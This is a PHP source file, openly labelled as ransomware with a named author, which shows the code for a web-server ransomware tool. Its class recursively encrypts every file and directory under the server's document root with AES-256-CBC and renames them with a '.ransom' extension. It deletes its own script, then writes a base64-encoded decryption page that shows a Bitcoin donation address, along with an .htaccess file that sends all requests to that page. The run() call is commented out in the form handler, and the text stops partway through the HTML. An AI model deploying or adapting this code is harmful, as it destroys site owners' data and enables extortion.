<?php
@error_reporting(0);
@set_time_limit(0);
class Ransomware {
    private $root = '';
    private $salt = '';
    private $recovery = '';
    private $cryptoKey = '';
    private $cryptoKeyLength = '32';
    private $iterations = '10000';
    private $algorithm = 'SHA512';
    private $iv = '';
    private $cipher = 'AES-256-CBC';
    private $extension = 'ransom';
    public function __construct($key) {
        $this->root = $_SERVER['DOCUMENT_ROOT'];
        $this->salt = openssl_random_pseudo_bytes(10);
        $this->recovery = base64_encode($key);
        $this->cryptoKey = @openssl_pbkdf2($key, $this->salt, $this->cryptoKeyLength, $this->iterations, $this->algorithm);
        $this->iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($this->cipher));
    }
    private function generateRandomFileName($directory, $extension) {
        $randomName = '';
        do {
            $randomName = str_replace(array('+', '/', '='), '', base64_encode(openssl_random_pseudo_bytes(6)));
            $randomName = $randomName ? $directory . '/' . $randomName . '.' . $extension : false;
        } while ($randomName !== false && file_exists($randomName));
        return $randomName;
    }
    private function createDecryptionFile($directory) {
        // decryption file encoded in Base64
        $data = base64_decode('PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpAc2V0X3RpbW' . 'VfbGltaXQoMCk7DQpjbGFzcyBSYW5zb213YXJlIHsNCiAgICBw' . 'cml2YXRlICRyb290ID0gJzxyb290Pic7DQogICAgcHJpdmF0ZS' . 'Akc2FsdCA9ICcnOw0KICAgIHByaXZhdGUgJGNyeXB0b0tleSA9' . 'ICcnOw0KICAgIHByaXZhdGUgJGNyeXB0b0tleUxlbmd0aCA9IC' . 'c8Y3J5cHRvS2V5TGVuZ3RoPic7DQogICAgcHJpdmF0ZSAkaXRl' . 'cmF0aW9ucyA9ICc8aXRlcmF0aW9ucz4nOw0KICAgIHByaXZhdG' . 'UgJGFsZ29yaXRobSA9ICc8YWxnb3JpdGhtPic7DQogICAgcHJp' . 'dmF0ZSAkaXYgPSAnJzsNCiAgICBwcml2YXRlICRjaXBoZXIgPS' . 'AnPGNpcGhlcj4nOw0KICAgIHByaXZhdGUgJGV4dGVuc2lvbiA9' . 'ICc8ZXh0ZW5zaW9uPic7DQogICAgcHVibGljIGZ1bmN0aW9uIF' . '9fY29uc3RydWN0KCRrZXkpIHsNCiAgICAgICAgJHRoaXMtPnNh' . 'bHQgPSBiYXNlNjRfZGVjb2RlKCc8c2FsdD4nKTsNCiAgICAgIC' . 'AgJHRoaXMtPmNyeXB0b0tleSA9IEBvcGVuc3NsX3Bia2RmMigk' . 'a2V5LCAkdGhpcy0+c2FsdCwgJHRoaXMtPmNyeXB0b0tleUxlbm' . 'd0aCwgJHRoaXMtPml0ZXJhdGlvbnMsICR0aGlzLT5hbGdvcml0' . 'aG0pOw0KICAgICAgICAkdGhpcy0+aXYgPSBiYXNlNjRfZGVjb2' . 'RlKCc8aXY+Jyk7DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rp' . 'b24gZGVsZXRlRGVjcnlwdGlvbkZpbGUoJGRpcmVjdG9yeSkgew' . '0KICAgICAgICB1bmxpbmsoJGRpcmVjdG9yeSAuICcvLmh0YWNj' . 'ZXNzJyk7DQogICAgICAgIHVubGluaygkX1NFUlZFUlsnU0NSSV' . 'BUX0ZJTEVOQU1FJ10pOw0KICAgIH0NCiAgICBwcml2YXRlIGZ1' . 'bmN0aW9uIGRlY3J5cHROYW1lKCRwYXRoKSB7DQogICAgICAgIC' . 'RkZWNyeXB0ZWROYW1lID0gQG9wZW5zc2xfZGVjcnlwdCh1cmxk' . 'ZWNvZGUocGF0aGluZm8oJHBhdGgsIFBBVEhJTkZPX0ZJTEVOQU' . '1FKSksICR0aGlzLT5jaXBoZXIsICR0aGlzLT5jcnlwdG9LZXks' . 'IDAsICR0aGlzLT5pdik7DQogICAgICAgICRkZWNyeXB0ZWROYW' . '1lID0gJGRlY3J5cHRlZE5hbWUgPyBzdWJzdHIoJHBhdGgsIDAs' . 'IHN0cnJpcG9zKCRwYXRoLCAnLycpICsgMSkgLiAkZGVjcnlwdG' . 'VkTmFtZSA6IGZhbHNlOw0KICAgICAgICByZXR1cm4gJGRlY3J5' . 'cHRlZE5hbWU7DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb2' . '4gZGVjcnlwdERpcmVjdG9yeSgkZW5jcnlwdGVkRGlyZWN0b3J5' . 'KSB7DQogICAgICAgIGlmIChwYXRoaW5mbygkZW5jcnlwdGVkRG' . 'lyZWN0b3J5LCBQQVRISU5GT19FWFRFTlNJT04pID09PSAkdGhp' . 'cy0+ZXh0ZW5zaW9uKSB7DQogICAgICAgICAgICAkZGlyZWN0b3' . 'J5ID0gJHRoaXMtPmRlY3J5cHROYW1lKCRlbmNyeXB0ZWREaXJl' . 'Y3RvcnkpOw0KICAgICAgICAgICAgaWYgKCRkaXJlY3RvcnkgIT' . '09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgcmVuYW1lKCRl' . 'bmNyeXB0ZWREaXJlY3RvcnksICRkaXJlY3RvcnkpOw0KICAgIC' . 'AgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHByaXZh' . 'dGUgZnVuY3Rpb24gZGVjcnlwdEZpbGUoJGVuY3J5cHRlZEZpbG' . 'UpIHsNCiAgICAgICAgaWYgKHBhdGhpbmZvKCRlbmNyeXB0ZWRG' . 'aWxlLCBQQVRISU5GT19FWFRFTlNJT04pID09PSAkdGhpcy0+ZX' . 'h0ZW5zaW9uKSB7DQogICAgICAgICAgICAkZGF0YSA9IEBvcGVu' . 'c3NsX2RlY3J5cHQoZmlsZV9nZXRfY29udGVudHMoJGVuY3J5cH' . 'RlZEZpbGUpLCAkdGhpcy0+Y2lwaGVyLCAkdGhpcy0+Y3J5cHRv' . 'S2V5LCAwLCAkdGhpcy0+aXYpOw0KICAgICAgICAgICAgaWYgKC' . 'RkYXRhICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgICRm' . 'aWxlID0gJHRoaXMtPmRlY3J5cHROYW1lKCRlbmNyeXB0ZWRGaW' . 'xlKTsNCiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT09IGZh' . 'bHNlICYmIHJlbmFtZSgkZW5jcnlwdGVkRmlsZSwgJGZpbGUpKS' . 'B7DQogICAgICAgICAgICAgICAgICAgIGlmICghZmlsZV9wdXRf' . 'Y29udGVudHMoJGZpbGUsICRkYXRhLCBMT0NLX0VYKSkgew0KIC' . 'AgICAgICAgICAgICAgICAgICAgICAgcmVuYW1lKCRmaWxlLCAk' . 'ZW5jcnlwdGVkRmlsZSk7DQogICAgICAgICAgICAgICAgICAgIH' . '0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQog' . 'ICAgICAgIH0NCiAgICB9DQogICAgcHJpdmF0ZSBmdW5jdGlvbi' . 'BzY2FuKCRkaXJlY3RvcnkpIHsNCiAgICAgICAgJGZpbGVzID0g' . 'QGFycmF5X2RpZmYoc2NhbmRpcigkZGlyZWN0b3J5KSwgYXJyYX' . 'koJy4nLCAnLi4nKSk7DQogICAgICAgIGlmICgkZmlsZXMgIT09' . 'IGZhbHNlKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkZmlsZX' . 'MgYXMgJGZpbGUpIHsNCiAgICAgICAgICAgICAgICBpZiAoaXNf' . 'ZGlyKCRkaXJlY3RvcnkgLiAnLycgLiAkZmlsZSkpIHsNCiAgIC' . 'AgICAgICAgICAgICAgICAgJHRoaXMtPnNjYW4oJGRpcmVjdG9y' . 'eSAuICcvJyAuICRmaWxlKTsNCiAgICAgICAgICAgICAgICAgIC' . 'AgJHRoaXMtPmRlY3J5cHREaXJlY3RvcnkoJGRpcmVjdG9yeSAu' . 'ICcvJyAuICRmaWxlKTsNCiAgICAgICAgICAgICAgICB9IGVsc2' . 'Ugew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZGVjcnlw' . 'dEZpbGUoJGRpcmVjdG9yeSAuICcvJyAuICRmaWxlKTsNCiAgIC' . 'AgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAg' . 'IH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHJ1bigpIH' . 'sNCiAgICAgICAgLy8gJHRoaXMtPmRlbGV0ZURlY3J5cHRpb25G' . 'aWxlKCR0aGlzLT5yb290KTsNCiAgICAgICAgaWYgKCR0aGlzLT' . '5jcnlwdG9LZXkgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAk' . 'dGhpcy0+c2NhbigkdGhpcy0+cm9vdCk7DQogICAgICAgIH0NCi' . 'AgICB9DQp9DQokZXJyb3JNZXNzYWdlID0gJyc7DQppZiAoaXNz' . 'ZXQoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10pICYmIHN0cn' . 'RvbG93ZXIoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10pID09' . 'PSAncG9zdCcpIHsNCiAgICBpZiAoaXNzZXQoJF9QT1NUWydrZX' . 'knXSkpIHsNCiAgICAgICAgbWJfaW50ZXJuYWxfZW5jb2Rpbmco' . 'J1VURi04Jyk7DQogICAgICAgIGlmIChtYl9zdHJsZW4oJF9QT1' . 'NUWydrZXknXSkgPCAxKSB7DQogICAgICAgICAgICAkZXJyb3JN' . 'ZXNzYWdlID0gJ1BsZWFzZSBlbnRlciBkZWNyeXB0aW9uIGtleS' . 'c7DQogICAgICAgIH0gZWxzZSBpZiAoIWV4dGVuc2lvbl9sb2Fk' . 'ZWQoJ29wZW5zc2wnKSkgew0KICAgICAgICAgICAgJGVycm9yTW' . 'Vzc2FnZSA9ICdPcGVuU1NMIG5vdCBlbmFibGVkJzsNCiAgICAg' . 'ICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRyYW5zb213YXJlID' . '0gbmV3IFJhbnNvbXdhcmUoJF9QT1NUWydrZXknXSk7DQogICAg' . 'ICAgICAgICAkcmFuc29td2FyZS0+cnVuKCk7DQogICAgICAgIC' . 'AgICB1bnNldCgkX1BPU1RbJ2tleSddLCAkcmFuc29td2FyZSk7' . 'DQogICAgICAgICAgICBAZ2NfY29sbGVjdF9jeWNsZXMoKTsNCi' . 'AgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IC8nKTsNCiAg' . 'ICAgICAgICAgIGV4aXQoKTsNCiAgICAgICAgfQ0KICAgIH0NCn' . '0NCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVu' . 'Ij4NCgk8aGVhZD4NCgkJPG1ldGEgY2hhcnNldD0iVVRGLTgiPg' . '0KCQk8dGl0bGU+UmFuc29td2FyZTwvdGl0bGU+DQoJCTxtZXRh' . 'IG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJSYW5zb213YX' . 'JlIHdyaXR0ZW4gaW4gUEhQLiI+DQoJCTxtZXRhIG5hbWU9Imtl' . 'eXdvcmRzIiBjb250ZW50PSJIVE1MLCBDU1MsIFBIUCwgcmFuc2' . '9td2FyZSI+DQoJCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVu' . 'dD0iSXZhbiDFoGluY2VrIj4NCgkJPG1ldGEgbmFtZT0idmlld3' . 'BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5p' . 'dGlhbC1zY2FsZT0xLjAiPg0KCQk8c3R5bGU+DQoJCQlodG1sIH' . 'sNCgkJCQloZWlnaHQ6IDEwMCU7DQoJCQl9DQoJCQlib2R5IHsN' . 'CgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjMjYyNjI2Ow0KCQkJCW' . 'Rpc3BsYXk6IGZsZXg7DQoJCQkJZmxleC1kaXJlY3Rpb246IGNv' . 'bHVtbjsNCgkJCQltYXJnaW46IDA7DQoJCQkJaGVpZ2h0OiBpbm' . 'hlcml0Ow0KCQkJCWNvbG9yOiAjRjhGOEY4Ow0KCQkJCWZvbnQt' . 'ZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOw' . '0KCQkJCWZvbnQtc2l6ZTogMWVtOw0KCQkJCWZvbnQtd2VpZ2h0' . 'OiA0MDA7DQoJCQkJdGV4dC1hbGlnbjogbGVmdDsNCgkJCX0NCg' . 'kJCS5mcm9udC1mb3JtIHsNCgkJCQlkaXNwbGF5OiBmbGV4Ow0K' . 'CQkJCWZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQoJCQkJYWxpZ2' . '4taXRlbXM6IGNlbnRlcjsNCgkJCQlqdXN0aWZ5LWNvbnRlbnQ6' . 'IGNlbnRlcjsNCgkJCQlmbGV4OiAxIDAgYXV0bzsNCgkJCQlwYW' . 'RkaW5nOiAwLjVlbTsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5s' . 'YXlvdXQgew0KCQkJCWJhY2tncm91bmQtY29sb3I6ICNEQ0RDRE' . 'M7DQoJCQkJcGFkZGluZzogMS41ZW07DQoJCQkJd2lkdGg6IDIx' . 'ZW07DQoJCQkJY29sb3I6ICMwMDA7DQoJCQkJYm9yZGVyOiAwLj' . 'A3ZW0gc29saWQgIzAwMDsNCgkJCX0NCgkJCS5mcm9udC1mb3Jt' . 'IC5sYXlvdXQgaGVhZGVyIHsNCgkJCQl0ZXh0LWFsaWduOiBjZW' . '50ZXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGhl' . 'YWRlciAudGl0bGUgew0KCQkJCW1hcmdpbjogMDsNCgkJCQlmb2' . '50LXNpemU6IDIuNmVtOw0KCQkJCWZvbnQtd2VpZ2h0OiA0MDA7' . 'DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IC5hYm91dC' . 'B7DQoJCQkJdGV4dC1hbGlnbjogY2VudGVyOw0KCQkJfQ0KCQkJ' . 'LmZyb250LWZvcm0gLmxheW91dCAuYWJvdXQgcCB7DQoJCQkJbW' . 'FyZ2luOiAxZW0gMDsNCgkJCQljb2xvcjogIzJGNEY0RjsNCgkJ' . 'CQlmb250LXdlaWdodDogNjAwOw0KCQkJCXdvcmQtd3JhcDogYn' . 'JlYWstd29yZDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlv' . 'dXQgLmFib3V0IGltZyB7DQoJCQkJYm9yZGVyOiAwLjA3ZW0gc2' . '9saWQgIzAwMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlv' . 'dXQgZm9ybSB7DQoJCQkJZGlzcGxheTogZmxleDsNCgkJCQlmbG' . 'V4LWRpcmVjdGlvbjogY29sdW1uOw0KCQkJCW1hcmdpbi10b3A6' . 'IDFlbTsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm' . '9ybSBpbnB1dCB7DQoJCQkJLXdlYmtpdC1hcHBlYXJhbmNlOiBu' . 'b25lOw0KCQkJCS1tb3otYXBwZWFyYW5jZTogbm9uZTsNCgkJCQ' . 'lhcHBlYXJhbmNlOiBub25lOw0KCQkJCW1hcmdpbjogMDsNCgkJ' . 'CQlwYWRkaW5nOiAwLjJlbSAwLjRlbTsNCgkJCQlmb250LWZhbW' . 'lseTogQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZjsNCgkJ' . 'CQlmb250LXNpemU6IDFlbTsNCgkJCQlib3JkZXI6IDAuMDdlbS' . 'Bzb2xpZCAjOUQyQTAwOw0KCQkJCS13ZWJraXQtYm9yZGVyLXJh' . 'ZGl1czogMDsNCgkJCQktbW96LWJvcmRlci1yYWRpdXM6IDA7DQ' . 'oJCQkJYm9yZGVyLXJhZGl1czogMDsNCgkJCX0NCgkJCS5mcm9u' . 'dC1mb3JtIC5sYXlvdXQgZm9ybSBpbnB1dFt0eXBlPSJzdWJtaX' . 'QiXSB7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogI0ZGNDUwMDsN' . 'CgkJCQljb2xvcjogI0Y4RjhGODsNCgkJCQljdXJzb3I6IHBvaW' . '50ZXI7DQoJCQkJdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xv' . 'ciAyMjBtcyBsaW5lYXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybS' . 'AubGF5b3V0IGZvcm0gaW5wdXRbdHlwZT0ic3VibWl0Il06aG92' . 'ZXIgew0KCQkJCWJhY2tncm91bmQtY29sb3I6ICNEODNBMDA7DQ' . 'oJCQkJdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAyMjBt' . 'cyBsaW5lYXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3' . 'V0IGZvcm0gLmVycm9yIHsNCgkJCQltYXJnaW46IDAgMCAxZW0g' . 'MDsNCgkJCQljb2xvcjogIzlEMkEwMDsNCgkJCQlmb250LXNpem' . 'U6IDAuOGVtOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91' . 'dCBmb3JtIC5lcnJvcjpub3QoOmVtcHR5KSB7DQoJCQkJbWFyZ2' . 'luOiAwLjJlbSAwIDFlbSAwOw0KCQkJfQ0KCQkJLmZyb250LWZv' . 'cm0gLmxheW91dCBmb3JtIGxhYmVsIHsNCgkJCQltYXJnaW4tYm' . '90dG9tOiAwLjJlbTsNCgkJCQloZWlnaHQ6IDEuMmVtOw0KCQkJ' . 'fQ0KCQkJQG1lZGlhIHNjcmVlbiBhbmQgKG1heC13aWR0aDogND' . 'gwcHgpIHsNCgkJCQkuZnJvbnQtZm9ybSAubGF5b3V0IHsNCgkJ' . 'CQkJd2lkdGg6IDE1LjVlbTsNCgkJCQl9DQoJCQl9DQoJCQlAbW' . 'VkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOiAzMjBweCkgew0K' . 'CQkJCS5mcm9udC1mb3JtIC5sYXlvdXQgew0KCQkJCQl3aWR0aD' . 'ogMTQuNWVtOw0KCQkJCX0NCgkJCQkuZnJvbnQtZm9ybSAubGF5' . 'b3V0IGhlYWRlciAudGl0bGUgew0KCQkJCQlmb250LXNpemU6ID' . 'IuNGVtOw0KCQkJCX0NCgkJCQkuZnJvbnQtZm9ybSAubGF5b3V0' . 'IC5hYm91dCBwIHsNCgkJCQkJZm9udC1zaXplOiAwLjllbTsNCg' . 'kJCQl9DQoJCQl9DQoJCTwvc3R5bGU+DQoJPC9oZWFkPg0KCTxi' . 'b2R5Pg0KCQk8ZGl2IGNsYXNzPSJmcm9udC1mb3JtIj4NCgkJCT' . 'xkaXYgY2xhc3M9ImxheW91dCI+DQoJCQkJPGhlYWRlcj4NCgkJ' . 'CQkJPGgxIGNsYXNzPSJ0aXRsZSI+UmFuc29td2FyZTwvaDE+DQ' . 'oJCQkJPC9oZWFkZXI+DQoJCQkJPGRpdiBjbGFzcz0iYWJvdXQi' . 'Pg0KCQkJCQk8cD5NYWRlIGJ5IEl2YW4gxaBpbmNlay48L3A+DQ' . 'oJCQkJCTxwPkkgaG9wZSB5b3UgbGlrZSBpdCE8L3A+DQoJCQkJ' . 'CTxwPkZlZWwgZnJlZSB0byBkb25hdGUgYml0Y29pbi48L3A+DQ' . 'oJCQkJCTxpbWcgc3JjPSJkYXRhOmltYWdlL2dpZjtiYXNlNjQs' . 'aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUpZQUFBQ1dDQUlBQU' . 'FDelkrYTFBQUFBQm1KTFIwUUEvd0QvQVArZ3ZhZVRBQUFEWWts' . 'RVFWUjRuTzJkeTI3ak1Bd0FuVVgvLzVmVHd4WTVDSTRnaGFUa2' . 'NXWXVDMno4YWdkRVdJbWtIOC9uOHhBeS8zWS9nRVQ1K2YvUDQv' . 'RlljNytwb0crZXFqbDMyYWQ5SXVkR2VOM1hLTVNqUWp3cXhLTk' . 'NQRCtuLzV2NGwwYi82NzJmVnZTcHk0d2lOMG84dCtIZFF4cUZl' . 'RlNJUjRWNFZJam5QSjFwaUt4V1JBN3VmOXJQVUNLUDBWdzVNZG' . '1wK0UwYWhYaFVpRWVGZUZTSVp5aWRxU1B4NjMwcTZZaGtLTXUy' . 'a3dZeEN2R29FSThLOGFnUXorWjBacXFrcFg5dUE2TCtKUVdqRU' . 'k4SzhhZ1Fqd3J4REtVemRVWDdVNG5EMUpKS1lvYVMrT05YL0Nh' . 'TlFqd3F4S05DUENyRWM1N083RnFlU093L1N1eGRtcnB5LytBS2' . 'pFSThLc1NqUWp3cXhQTzQxTGlFdWxLYXlLN1d4VEVLOGFnUWp3' . 'cnhxQkJQL3R5WnVsMmV4T1dZWFdOb0VqOTlZUlRpVVNFZUZlSl' . 'JJWjZoMVpsbG5jcTdCdVZGK3A3cUp0b01ubXNVNGxFaEhoWGlV' . 'U0dlVDBxQnAxWko2bGhXU2pQVllKVllXZVBjbVc5QmhYaFVpRW' . 'VGZUlZMm14SW40eTJyanBtNmIrSVl2Y1FSd200MmZRc3F4S05D' . 'UENyRTg1Zk8xRFgrSko2YnVLdTFhODhyY3FOM0dJVjRWSWhIaF' . 'hoVWlPZXZkbVpCaWNmSXdWUDMzZlVZZFMzZ245M1hLTVNqUWp3' . 'cXhLTkNQT2ZwekxJdjhHWEQ3cTdadDIzdGpCeUhDbStBQ3ZHb0' . 'VFLzVHTDI2dXB2SW1sSGREbEhpd1lNWWhYaFVpRWVGZUZTSVo2' . 'aDJKckphVWJjSDFMOVJaS09xTHF1cXFKTTJDdkdvRUk4SzhhZ1' . 'F6M2xuRTJJUGFOZnN1d2dWVnpZSzhhZ1Fqd3J4cUJCUFF1MU1l' . 'OFdDL1pRNGRUOWc0dEtWbTAxZmlncnhxQkNQQ3ZFTWpkRnJtUG' . '9TdnNnNDNzUlA2M0s5cVlQZGJMb1BLc1NqUWp3cXhKTS9GYmho' . 'V2RQUXNyMm5xY2RJdkpGajlHNkxDdkdvRUk4SzhXeCtvM1pkLz' . 'NUaS90R3k0WDVUdURwekgxU0lSNFY0Vklnbi80M2FmUks3cXhP' . 'dnZLdkJ5cW5BY2h3cXZBRXF4S05DUE9lYlRYVzlQUDBiSmM0TT' . 'NqWHJyKzZkVGU4T05ncnhxQkNQQ3ZHb0VNOVE3Y3l5TnhNazF0' . 'RTIxRFVyN1hxLzFRdWpFSThLOGFnUWp3cnhmTkxaVkVla3BhZ2' . 'hjVWxsMlZ2QVA4dHVqRUk4S3NTalFqd3F4SE90ZEtZaGt0MHMy' . 'eEpxcUt0Q3NyUHB0cWdRandyeHFCRFBKNDNheTZpcjdvMFU3UF' . 'paM3lCdUZPSlJJUjRWNGxFaG52SlhVQzVqMTdDWS9xVVdMQ0Va' . 'aFhoVWlFZUZlRlNJWi9QY0dZbGpGT0pSSVo1ZmVndFRVQVhwVm' . 'hVQUFBQUFTVVZPUks1Q1lJST0iIGFsdD0iQml0Y29pbiBXYWxs' . 'ZXQiPg0KCQkJCQk8cD4xQnJaTTZUN0c5Uk44dmJhYm5mWHU0TT' . 'ZMcGd6dHE2WTE0PC9wPg0KCQkJCTwvZGl2Pg0KCQkJCTxmb3Jt' . 'IG1ldGhvZD0icG9zdCIgYWN0aW9uPSI8P3BocCBlY2hvICcuLy' . 'cgLiBwYXRoaW5mbygkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1F' . 'J10sIFBBVEhJTkZPX0JBU0VOQU1FKTsgPz4iPg0KCQkJCQk8bG' . 'FiZWwgZm9yPSJrZXkiPkRlY3J5cHRpb24gS2V5PC9sYWJlbD4N' . 'CgkJCQkJPGlucHV0IG5hbWU9ImtleSIgaWQ9ImtleSIgdHlwZT' . '0idGV4dCIgc3BlbGxjaGVjaz0iZmFsc2UiIGF1dG9mb2N1cz0i' . 'YXV0b2ZvY3VzIj4NCgkJCQkJPHAgY2xhc3M9ImVycm9yIj48P3' . 'BocCBlY2hvICRlcnJvck1lc3NhZ2U7ID8+PC9wPg0KCQkJCQk8' . 'aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRGVjcnlwdCI+DQ' . 'oJCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIHZhbHVlPSI8cmVj' . 'b3Zlcnk+IiBwbGFjZWhvbGRlcj0iYjY0LXJlY292ZXJ5Ij4NCg' . 'kJCQk8L2Zvcm0+DQoJCQk8L2Rpdj4NCgkJPC9kaXY+DQoJPC9i' . 'b2R5Pg0KPC9odG1sPg0K');
        $data = str_replace(
            array(
                '<root>',
                '<salt>',
                '<recovery>',
                '<cryptoKeyLength>',
                '<iterations>',
                '<algorithm>',
                '<iv>',
                '<cipher>',
                '<extension>'
            ),
            array(
                $this->root,
                base64_encode($this->salt),
                $this->recovery,
                $this->cryptoKeyLength,
                $this->iterations,
                $this->algorithm,
                base64_encode($this->iv),
                $this->cipher,
                $this->extension
            ),
            $data
        );
        if (($decryptionFile = $this->generateRandomFileName($directory, 'php')) !== false) {
            file_put_contents($decryptionFile, $data, LOCK_EX);
            $decryptionFile = pathinfo($decryptionFile, PATHINFO_BASENAME);
            file_put_contents($directory . '/.htaccess', "DirectoryIndex /{$decryptionFile}\nErrorDocument 400 /{$decryptionFile}\nErrorDocument 401 /{$decryptionFile}\nErrorDocument 403 /{$decryptionFile}\nErrorDocument 404 /{$decryptionFile}\nErrorDocument 500 /{$decryptionFile}\n", LOCK_EX);
        }
    }
    private function encryptName($path) {
        $encryptedName = '';
        do {
            $encryptedName = @openssl_encrypt(pathinfo($path, PATHINFO_BASENAME), $this->cipher, $this->cryptoKey, 0, $this->iv);
            $encryptedName = $encryptedName ? substr($path, 0, strripos($path, '/') + 1) . urlencode($encryptedName) . '.' . $this->extension : false;
        } while ($encryptedName !== false && file_exists($encryptedName));
        return $encryptedName;
    }
    private function encryptDirectory($directory) {
        $encryptedDirectory = $this->encryptName($directory);
        if ($encryptedDirectory !== false) {
            rename($directory, $encryptedDirectory);
        }
    }
    private function encryptFile($file) {
        $encryptedData = @openssl_encrypt(file_get_contents($file), $this->cipher, $this->cryptoKey, 0, $this->iv);
        if ($encryptedData !== false) {
            $encryptedFile = $this->encryptName($file);
            if ($encryptedFile !== false && rename($file, $encryptedFile)) {
                if (!file_put_contents($encryptedFile, $encryptedData, LOCK_EX)) {
                    rename($encryptedFile, $file);
                }
            }
        }
    }
    private function scan($directory) {
        $files = @array_diff(scandir($directory), array('.', '..'));
        if ($files !== false) {
            foreach ($files as $file) {
                if (is_dir($directory . '/' . $file)) {
                    $this->scan($directory . '/' . $file);
                    $this->encryptDirectory($directory . '/' . $file);
                } else {
                    $this->encryptFile($directory . '/' . $file);
                }
            }
        }
    }
    public function run() {
        unlink($_SERVER['SCRIPT_FILENAME']);
        if ($this->cryptoKey !== false) {
            $this->scan($this->root);
            $this->createDecryptionFile($this->root);
        }
    }
}
$errorMessage = '';
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
    if (isset($_POST['key'])) {
        mb_internal_encoding('UTF-8');
        if (mb_strlen($_POST['key']) < 1) {
            $errorMessage = 'Please enter encryption key';
        } else if (!extension_loaded('openssl')) {
            $errorMessage = 'OpenSSL not enabled';
        } else {
            $ransomware = new Ransomware($_POST['key']);
            // $ransomware->run();
            unset($_POST['key'], $ransomware);
            @gc_collect_cycles();
            header('Location: /');
            exit();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Ransomware</title>
		<meta name="description" content="Ransomware written in PHP.">
		<meta name="keywords" content="HTML, CSS, PHP, ransomware">
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<style>
			html {
				height: 100%;
			}
			body {
				background-color: #262626;
				display: flex;
				flex-direction: column;
				margin: 0;
				height: inherit;
				color: #F8F8F8;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				font-weight: 400;
				text-align: left;
			}
			.front-form {
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				flex: 1 0 auto;
				padding: 0.5em;
			}
			.front-form .layout {
				background-color: #DCDCDC;
				padding: 1.5em;
				width: 21em;
				color: #000;
				border: 0.07em solid #000;
			}
			.front-form .layout header {
				text-align: center;
			}
			.front-form .layout header .title {
				margin: 0;
				font-size: 2.6em;
				font-weight: 400;
			}
			.front-form .layout header p {
				margin: 0;
				font-size: 1.2em;
			}
			.front-form .layout .advice p {
				margin: 1em 0 0 0;
			}
			.front-form .layout form {
				display: flex;
				flex-direction: column;
				margin-top: 1em;
			}
			.front-form .layout form input {
				-webkit-appearance: none;
				-moz-appearance: none;
				appearance: none;
				margin: 0;
				padding: 0.2em 0.4em;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				border: 0.07em solid #9D2A00;
				-webkit-border-radius: 0;
				-moz-border-radius: 0;
				border-radius: 0;
			}
			.front-form .layout form input[type="submit"] {
				background-color: #FF4500;
				color: #F8F8F8;
				cursor: pointer;
				transition: background-color 220ms linear;
			}
			.front-form .layout form input[type="submit"]:hover {
				background-color: #D83A00;
				transition: background-color 220ms linear;
			}
			.front-form .layout form .error {
				margin: 0 0 1em 0;
				color: #9D2A00;
				font-size: 0.8em;
			}
			.front-form .layout form .error:not(:empty) {
				margin: 0.2em 0 1em 0;
			}
			.front-form .layout form label {
				margin-bottom: 0.2em;
				height: 1.2em;
			}
			@media screen and (max-width: 480px) {
				.front-form .layout {
					width: 15.5em;
				}
			}
			@media screen and (max-width: 320px) {
				.front-form .layout {
					width: 14.5em;
				}
				.front-form .layout header .title {
					font-size: 2.4em;
				}
				.front-form .layout header p {
					font-size: 1.1em;
				}
				.front-form .layout .advice p {
					font-size: 0.9em;
				}
			}
		</style>
	</head>
	<body>
		<div class="front-form">
			<div class="layout">
				<header>
					<h1 class="title">Ransomware</h1>
					<p>Made by Ivan Šincek</p>
				</header>
